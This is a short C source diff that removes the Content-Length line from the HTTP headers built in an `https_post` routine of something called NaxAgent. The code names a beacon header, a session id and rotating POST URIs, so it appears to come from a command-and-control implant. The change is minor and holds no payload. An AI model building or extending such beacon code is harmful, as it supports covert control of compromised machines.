@@ -455,10 +455,9 @@ static uint8_t *https_post(NaxAgent *a,
         hdr_len = (uint32_t)snprintf(hdrs, sizeof(hdrs),
             "%s: %s\r\n"
             "Content-Type: application/octet-stream\r\n"
-            "%s: 1\r\n"
-            "Content-Length: %u\r\n",
+            "%s: 1\r\n",
             g_beacon_hdr, a->session_id,
-            g_public_hdr, send_len);
+            g_public_hdr);
     }
 
     const char *uri = profile_active ? nax_profile_post_uri_rotate() : g_uri_post;
